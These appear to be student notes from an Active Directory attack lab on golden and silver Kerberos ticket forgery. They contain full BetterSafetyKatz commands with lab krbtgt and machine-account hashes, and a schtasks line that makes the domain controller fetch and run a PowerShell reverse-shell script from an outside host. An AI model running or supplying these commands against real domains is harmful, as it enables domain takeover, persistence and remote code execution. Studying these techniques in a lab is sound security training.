# **Domain Persistence**


- There is much to active directory than "just" the Domain Admin.
- Once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up!



## **Kerberos**

- Kerberos is the basis of authentication in a Windows Active Directory environment.
- Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller.
- These tickets represent the client's credentials.Therefore, Kerberos is understandably a very interesting target of abuse!



![](https://i.imgur.com/lpHU58k.png)



## **Golden Ticket**


- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.




![](https://i.imgur.com/f4Ti5Jm.png)




|  Options    |      |
|:-----|:-----|
|  kerberos::golden    |   Name of the module   |
|    /User:Administrator  |   Username for which the TGT is generated   |
|   /domain:dollarcorp.moneycorp.local   |  Domain FQDN    |
|  /sid:S-1-5-21-719815819-3726368948-3917688648|   SID of the domain   |
|   /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848   |   AES256 keys of the krbtgt account. Using AES keys makes the attack more silent.  |
|    /id:500 /groups:512  |   Optional User RID (default 500) and Group default 513 512 520518 519)   |
| /ptt   |    Injects the ticket in current PowerShell process - no need to save the ticket on disk  |
|   OR         |
|    /ticket  |    Saves the ticket to a file for later use  |
|    /startoffset:0  |  Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.    |
|    /endin:600  |    Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes  |
|   /renewmax:10080   |   Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800   |



**_Example Command_ -:**

- Run the below command to create a Golden ticket on any machine that has network connectivity with DC (You can use the above table to check what each does):

```powershell
$ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```



# **Learning Objective 8**

- Extra secrets from the domain controller of dollarcorp.
- Using the secrets of krbtgt account, create a golden ticket.
- Use the Golden ticket to (once again) get domain admin privileges from a machine

 

## **Silver Ticket**


- A valid TGS (Golden ticket is TGT).
- Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
- Services rarely check PAC (Privileged Attribute Certificate).
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts).




![](https://i.imgur.com/FIuN49E.png)






|  Options    |      |
|:-----|:-----|
|  kerberos::golden    |   Name of the module (there is no silver module!)  |
|    /User:Administrator  |   Username for which the TGT is generated   |
|   /domain:dollarcorp.moneycorp.local   |  Domain FQDN    |
|  /sid:S-1-5-21-719815819-3726368948-3917688648|   SID of the domain   |
| /target:dcorp-dc.dollarcorp.moneycorp.local | Target server FQDN |
|    /service:cifs  |  The SPN name of service for which TGS is to be created    |
|   /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848   |   AES256 keys of the krbtgt account. Using AES keys makes the attack more silent.  |
|    /id:500 /groups:512  |   Optional User RID (default 500) and Group default 513 512 520518 519)   |
| /ptt   |    Injects the ticket in current PowerShell process - no need to save the ticket on disk  |
|    /startoffset:0  |  Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.    |
|    /endin:600  |    Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes  |
|   /renewmax:10080   |   Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800   |


**_Example Usage -:_**

- Using hash of the Domain Controller computer account, below command provides access to file system on the DC

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

# Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more
```

- There are also various ways of achieving command execution using Silver tickets. 
- Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:



```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```



Schedule and execute a task - noisy but fine for PoC :)



```powershell
$ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
```


# **Learning Objective 9**


- [ ] During the additional lab time:
	- Try to get command execution on the domain controller by creating silver tickets for:
		- HOST service
		- WMI



## **Solution**


**_Coming Soon_**



> In case of Golden ticket we forge a TGT, in case of Silver ticket we forge a Service ticket or a TGS





